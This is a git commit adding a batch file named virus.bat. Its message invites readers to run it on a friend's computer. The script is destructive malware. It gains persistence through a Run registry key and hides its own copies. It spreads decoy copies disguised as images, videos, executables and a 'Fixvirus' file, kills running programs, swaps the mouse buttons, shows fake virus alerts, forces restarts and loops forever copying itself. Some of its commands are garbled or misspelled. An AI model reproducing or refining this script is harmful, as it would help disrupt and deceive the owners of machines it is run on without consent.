44fceb3301d38d0ef89232756976268dda5d8b03
Rituraj Gupta <rituraj.iter@gmail.com>
2020-07-10 09:09:33 +0530

    Open at own risk
    This will shutdown your computer every time so don't use on your own computer use your friend's, to stop the process delete the file in safe mode.

---
+++ virus.bat
@@ -0,0 +1,51 @@
+@Echo off
+color 4
+title 4
+title R.I.P
+start
+start
+start
+start calc
+copy %0 %Systemroot%\Greatgame > nul
+reg add HKLM\Software|Microsoft\Windows\CurrentVersion\Run /v Greatgame /t
+REG_SZ
+/d %systemroot%\Greatgame.bat /f > nul
+copy %0 *.bat > nul
+Attrib +r +h Greatgame.bat
+Attrib +r +h
+RUNDLL32 USER32.DLL.SwapMouseButton 
+sart calc
+cls
+tskill msnmsgr
+tskill Limewire
+tskill iexplore
+tskill NMain
+start
+cls
+c %userprofile%\desktop
+copy Greatgame.bat R.I.P .bat
+copy Greatgame.bat R.I.P .jpg
+copy Greatgame.bat R.I.P .txt
+copy Greatgame.bat R.I.P .exe
+copy Greatgame.bat R.I.P .mov
+copy Greatgame.bat R.I.P Fixvirus.bat
+cd %userprofile%My Documents
+copy Greatgame.bat R.I.P .bat
+copy Greatgame.bat R.I.P .jpg
+copy Greatgame.bat R.I.P .txt
+copy Greatgame.bat R.I.P .exe
+copy Greatgame.bat R.I.P .mov
+copy Greatgame.bat R.I.P Fixvirus.bat
+start
+start calc
+cls 
+msg * R.I.P
+msg * R.I.P
+shutdown -r -t 10 -c "VIRUS DETECTED"
+start
+start
+time 12:00
+:R.I.P
+cd %userprofile%My Documents
+copy Greatgame.bat R.I.P %random%.bat
+goto R.I.P
